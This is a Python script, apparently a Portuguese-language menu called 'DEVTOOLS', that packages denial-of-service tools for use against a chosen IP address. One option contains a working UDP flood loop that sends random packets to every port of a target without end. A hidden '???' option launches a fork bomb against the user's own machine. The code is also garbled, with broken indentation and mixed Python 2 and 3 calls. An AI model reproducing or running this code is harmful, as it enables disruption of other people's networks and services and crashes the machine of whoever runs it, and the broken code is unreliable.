import requests
import os
import sys
import time

sys.path.insert(1, './lib')

def menu():
	print("""
	
	  \033[34mDEVTOOLS\033[m
	    by \033[33m@SAS\033[m
	   
          \033[44mVersao: 1.0\033[m
         
  Opcoes:

  \033[36m[\033[m1\033[36m]\033[m ddos-tool
  \033[36m[\033[m2\033[36m]\033[m ddos-attack
  \033[36m[\033[m3\033[36m]\033[m pyflooder

  \033[36m[\033[m90\033[36m]\033[m \033[31m???\033[m
  \033[36m[\033[m91\033[36m]\033[m \033[31mVoltar\033[m
  \033[36m[\033[m92\033[36m]\033[m \033[31mSair\033[m
""")

clear = lambda: os.system('clear')

menu()

kk = int(input('\033[34m===>\033[m '))

if kk == (1):
	clear()
	print("""
               _                                  
  ___ ___   __| | ___  __      __  _ __ ___   ___ 
 / __/ _ \ / _` |/ _ \ \ \ /\ / / | '_ ` _ \ / _ \\
| (_| (_) | (_| |  __/  \ V  V /  | | | | | |  __/
 \___\___/ \__,_|\___|   \_/\_(_) |_| |_| |_|\___|                                                
   
    Build a Simple DDoS Script with Python
    Authors: @Lekssays and @omarchaan\n\n
    usage: 
    cd lib
    python xha.py [-h] [-u USER_AGENTS] -t TARGET -tr THREADS -s SLEEP
ddostool.py: error: the following arguments are required: -t/--target, -tr/--threads, -s/--sleep
    """)
    
if kk == (2):
	clear()
	import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print("Author   : HA-MRX")
print ("You Tube : https://www.youtube.com/c/HA-MRX")
print("github   : https://github.com/Ha3MrX")
print("Facebook : https://www.facebook.com/muhamad.jabar222")
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1



if kk == (3):
	clear()
	print('ERROR\n Usage:\n cd lib\n python lol.py < Hostname > < Port > < Number_of_Attacks >')

if kk == (90):
	clear()
	print('Morreu kkkkkk')
	while True:
		os.fork()	
	
if kk == (91):
	clear()
	print('Voltando em 1s')
	time.sleep(1)
	import menu
																					
if kk == (92):
	print('Saindo...')
	time.sleep(1)
	exit()
